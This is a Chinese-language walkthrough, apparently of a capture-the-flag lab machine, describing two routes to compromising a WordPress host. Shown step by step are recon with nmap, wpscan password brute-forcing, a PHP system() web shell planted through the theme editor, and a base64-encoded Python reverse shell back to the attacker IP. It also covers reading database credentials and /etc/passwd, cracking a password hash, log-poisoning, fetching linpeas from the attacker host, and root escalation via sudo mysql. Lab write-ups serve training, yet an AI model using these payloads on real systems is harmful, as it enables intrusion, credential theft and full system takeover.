### 第一條路 :

1.  偵測在同一個網段內有哪些裝置在線
    ```
    $ sudo netdiscover -i eth0
    ```
2. 對指定 IP 進行服務版本掃描
    ```
    $ nmap 192.168.121.130 -sV 
    ```
    
    > PORT       STATE   SERVICE  VERSION
    22/tcp     open     ssh         OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0)
    80/tcp     open     http        Apache httpd 2.4.52 ((Ubuntu))
    8899/tcp open     http        Apache httpd 2.4.52 ((Ubuntu))
    > 
3. 修改 host
    ```
    $ sudo nano /etc/hosts
    ```
4. 列舉帳號名
    ```
    $ wpscan --url [http://192.168.121.130](http://192.168.121.130/) -e u
    ```
    > oh_my_password_is_week
    > 
5. 密碼爆破
    ```
    $ wpscan --url [http://192.168.121.130](http://192.168.121.130/) -P /usr/share/wordlists/rockyou.txt -U oh_my_password_is_week 
    ```
    > rockyoupassword
    > 
6. 監聽 port
    ```
    $ nc -lvnp 4444
    ```
7. wordpress 主題檔案編輯器
     ```
    <pre>
    <?php
    system($_GET['cmd']);
    ?>
    </pre>
    ```
8. 網址輸入 command，執行 cmd 指令
     ```
     cmd=echo cHl0aG9uMyAtYyAnaW1wb3J0IG9zLHB0eSxzb2NrZXQ7cz1zb2NrZXQuc29ja2V0KCk7cy5jb25uZWN0KCgiMTkyLjE2OC4xMjEuMTI4Iiw0NDQ0KSk7W29zLmR1cDIocy5maWxlbm8oKSxmKWZvciBmIGluKDAsMSwyKV07cHR5LnNwYXduKCJiYXNoIikn | base64 -d | bash
     ```
9. 升級shell
    ```
    $ python upgrade to tty
    $ python3 -c “import pty;pty.spawn(’/bin/bash’)”
    $ export TERM=xterm
    ```
    ctrl+z (將 nc 放入背景)
    ```
    # 拿回 nc
    $ stty raw -echo;fg 
    ```
10. 查看資料庫相關資訊
    ```
    $ cat wp-config.php
    /** The name of the database for WordPress */
    define( 'DB_NAME', 'wordpress' );
    /** Database username */
    define( 'DB_USER', 'keep_going' );
    /** Database password */
    define( 'DB_PASSWORD', 'you_are_in_the_right_way' );
    ```
11. 印出 `etc/passwd`
    ```
    $ cat /etc/passwd | grep bash
    root:x:0:0:root:/root:/bin/bash
    developer:x:1000:1000:onward:/home/developer:/bin/bash
    ```
12. 連接資料庫
    ```
    $ mysql -u keep_going wordpress -p
    ```
13. 查看 tables
    ```
    mysql> show tables;
    +-----------------------+
    | Tables_in_wordpress   |
    +-----------------------+
    | backupUsers           |
    | wp_commentmeta        |
    | wp_comments           |
    | wp_links              |
    | wp_options            |
    | wp_postmeta           |
    | wp_posts              |
    | wp_term_relationships |
    | wp_term_taxonomy      |
    | wp_termmeta           |
    | wp_terms              |
    | wp_usermeta           |
    | wp_users              |
    +-----------------------+
    ```
14. 查看 backupUsers
    ```
    mysql> describe backupUsers;
    +------------+--------------+------+-----+---------+-------+
    | Field      | Type         | Null | Key | Default | Extra |
    +------------+--------------+------+-----+---------+-------+
    | ID         | int          | YES  |     | NULL    |       |
    | user_login | varchar(60)  | YES  |     | NULL    |       |
    | user_pass  | varchar(255) | YES  |     | NULL    |       |
    +------------+--------------+------+-----+---------+-------+
    3 rows in set (0.00 sec)
    ```
15. 再查看 backupUsers 的欄位
    ```
    mysql> select ID, user_login, user_pass from backupUsers;
    +------+------------+------------------------------------+
    | ID   | user_login | user_pass                          |
    +------+------------+------------------------------------+
    |    0 | developer  | $P$BE3BfMlpaIeM7t.9j2TCvCXjgH0b7q/ |
    +------+------------+------------------------------------+
    1 row in set (0.00 sec)
    ```
16. 辨別是哪種加密
    ```
    $ hash-identifier
    HASH: $P$BE3BfMlpaIeM7t.9j2TCvCXjgH0b7q/
    Possible Hashs:
    [+] MD5(Wordpress)
    ```
17. 將 hash 過的密碼存為一文檔
    ```
    $ nano developer.hash
    ```
18. 解碼 
    ```
    $ hashcat -m 400 developer.hash /usr/share/wordlists/rockyou.txt
    ```
    ```
    $ john --wordlist=/usr/share/wordlists/rockyou.txt developer.hash
    ```
    > 1qaz2wsx
19. 查看 `local.txt`
    ```
    $ cat local.txt
    3d54057c3add9713f329dd57b6bb7c19
    ```
20. 顯示 developer 底下的 mysql 有提權的可能
    ```
    $ sudo -l 
    User developer may run the following commands on onwardeasy:
    (root) /bin/mysql
    ```
21. 提權
    ```
    $ sudo mysql -e '\! /bin/sh'
    ```
22. 查看 `proof.txt`
    ```
    $ cat proof.txt
    7d1a9a843ac8a3a766dc7cdbb38ed812
    ```
---

### 第二條路 :
1. 連線，php 指令寫入 log
    ```
    $ nc 192.168.121.130 22
    ```
    ```
    <?php system($_GET['cmd']);?>
    ```
2. 監聽本地
    ```
    $ python -m http.server
    ```
3. 讓受害者取得 kali 端的 ps.php (網址輸入)
    
    ```
    victim > cmd=wget 192.168.121.128:8000/linpeas.sh -o /tmp/linpeas.sh
    ``` 
4. 網址輸入 `le.onward:8899/ps.php` 運行 linpeas
5. 成功彈回 (以下跟第一條路一樣)